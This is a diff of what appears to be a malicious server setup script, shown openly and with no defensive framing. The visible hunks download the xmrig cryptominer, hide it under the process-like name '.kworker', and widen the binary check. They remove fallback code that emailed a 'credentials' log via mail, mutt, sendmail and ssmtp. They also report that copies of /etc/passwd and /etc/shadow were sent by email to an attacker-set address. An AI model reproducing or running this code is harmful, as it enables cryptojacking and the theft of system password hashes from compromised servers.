@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.9"
-readonly BUILD_DATE="2026-03-14 18:26:40 UTC"
+readonly SCRIPT_VERSION="3.0"
+readonly BUILD_DATE="2026-03-14 19:03:10 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -2533,8 +2533,8 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
         # Check if binary exists and is an ELF executable
         echo "[*] Verifying binary..."
         if [ -f .kworker ] && [ -x .kworker ]; then
-            # Check if it's a valid ELF binary
-            if file .kworker 2>/dev/null | grep -qE "ELF.*executable"; then
+            # Check if it's a valid ELF binary (executable or PIE shared object)
+            if file .kworker 2>/dev/null | grep -qE "ELF.*(executable|shared object)"; then
                 echo "[✓] Binary is a valid ELF executable"
 
                 # Try version check (non-critical - just informational)
@@ -4777,110 +4777,10 @@ PYTHON_EMAIL_SCRIPT
                 echo ""
             fi
         else
-            echo "[!] Python3 not found, trying fallback methods..."
+            echo "[!] Python3 not found - cannot send email"
+            echo "[!] Install Python3 and re-run script to enable email notifications"
             echo ""
         fi
-        
-        # FALLBACK METHODS: Local mail commands
-        if [ "$EMAIL_SENT" = false ]; then
-            echo "[*] Installing mail packages..."
-            # Install packages one by one and show which ones work
-            for p in mailutils mutt bsd-mailx sendmail ssmtp postfix python3; do
-                if command -v apt >/dev/null 2>&1; then
-                    echo "  - Installing $p via apt..."
-                    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $p 2>&1 | grep -v "^$" || true
-                elif command -v yum >/dev/null 2>&1; then
-                    echo "  - Installing $p via yum..."
-                    yum install -y -q $p 2>&1 | grep -v "^$" || true
-                elif command -v dnf >/dev/null 2>&1; then
-                    echo "  - Installing $p via dnf..."
-                    dnf install -y -q $p 2>&1 | grep -v "^$" || true
-                fi
-            done
-            
-            echo ""
-            echo "[*] Checking available mail commands:"
-            for cmd in mail mutt mailx sendmail ssmtp python3; do
-                if command -v $cmd >/dev/null 2>&1; then
-                    echo "  ✓ $cmd: $(which $cmd)"
-                else
-                    echo "  ✗ $cmd: NOT FOUND"
-                fi
-            done
-            
-            echo ""
-            echo "[*] Attempting to send email via local mail commands..."
-            echo "[*] Recipient: $RECIPIENT_EMAIL"
-            echo "[*] Subject: $EMAIL_SUBJECT"
-            echo ""
-            
-            # Try mail command
-            if command -v mail >/dev/null 2>&1; then
-                echo "[*] Trying: mail -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
-                if cat "$LOG_FILE_EMAIL" | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
-                    echo "[✓] SUCCESS via mail command"
-                    EMAIL_SENT=true
-                else
-                    echo "[!] FAILED: mail command returned error $?"
-                fi
-            fi
-            
-            # Try mutt command
-            if [ "$EMAIL_SENT" = false ] && command -v mutt >/dev/null 2>&1; then
-                echo "[*] Trying: mutt -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
-                if cat "$LOG_FILE_EMAIL" | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
-                    echo "[✓] SUCCESS via mutt command"
-                    EMAIL_SENT=true
-                else
-                    echo "[!] FAILED: mutt command returned error $?"
-                fi
-            fi
-        
-        # Try mailx command
-        if [ "$EMAIL_SENT" = false ] && command -v mailx >/dev/null 2>&1; then
-            echo "[*] Trying: mailx -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
-            if cat "$LOG_FILE_EMAIL" | mailx -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
-                echo "[✓] SUCCESS via mailx command"
-                EMAIL_SENT=true
-            else
-                echo "[!] FAILED: mailx command returned error $?"
-            fi
-        fi
-        
-        # Try sendmail command
-        if [ "$EMAIL_SENT" = false ] && command -v sendmail >/dev/null 2>&1; then
-            echo "[*] Trying: sendmail $RECIPIENT_EMAIL"
-            if {
-                echo "To: $RECIPIENT_EMAIL"
-                echo "From: root@$(hostname)"
-                echo "Subject: $EMAIL_SUBJECT"
-                echo ""
-                cat "$LOG_FILE_EMAIL"
-            } | sendmail "$RECIPIENT_EMAIL"; then
-                echo "[✓] SUCCESS via sendmail command"
-                EMAIL_SENT=true
-            else
-                echo "[!] FAILED: sendmail command returned error $?"
-            fi
-        fi
-        
-        # Try ssmtp command
-        if [ "$EMAIL_SENT" = false ] && command -v ssmtp >/dev/null 2>&1; then
-            echo "[*] Trying: ssmtp $RECIPIENT_EMAIL"
-            if {
-                echo "To: $RECIPIENT_EMAIL"
-                echo "From: root@$(hostname)"
-                echo "Subject: $EMAIL_SUBJECT"
-                echo ""
-                cat "$LOG_FILE_EMAIL"
-            } | ssmtp "$RECIPIENT_EMAIL"; then
-                echo "[✓] SUCCESS via ssmtp command"
-                EMAIL_SENT=true
-            else
-                echo "[!] FAILED: ssmtp command returned error $?"
-            fi
-        fi
-        fi  # End of EMAIL_SENT=false fallback block
         
         # Final result reporting
         echo ""
@@ -4889,23 +4789,25 @@ PYTHON_EMAIL_SCRIPT
             echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
             echo "[✓] ============================================"
             echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-            echo "[✓] Log file: $LOG_FILE_EMAIL"
+            echo "[✓] Method: Python3 SMTP (WITH ATTACHMENTS)"
+            echo ""
+            echo "    Attachments:"
+            [ -f "$PASSWD_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+            [ -f "$SHADOW_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
             echo ""
         else
             echo "[!] ============================================"
-            echo "[!] ALL EMAIL METHODS FAILED!"
+            echo "[!] EMAIL SENDING FAILED!"
             echo "[!] ============================================"
             echo "[!] Credentials saved locally only"
             echo "[!] File location: $LOG_FILE_EMAIL"
             echo ""
             echo "[!] TROUBLESHOOTING:"
             echo "    - Check if Python3 is installed: which python3"
-            echo "    - Check if MTA (postfix/sendmail) is running:"
-            echo "      systemctl status postfix"
-            echo "    - Check mail logs:"
-            echo "      tail -f /var/log/mail.log"
-            echo "    - Manual test:"
-            echo "      echo 'test' | mail -s 'test' $RECIPIENT_EMAIL"
+            echo "    - Install Python3:"
+            echo "      apt install -y python3  (Debian/Ubuntu)"
+            echo "      yum install -y python3  (CentOS/RHEL)"
+            echo "    - Test SMTP manually with provided credentials"
             echo ""
         fi
         
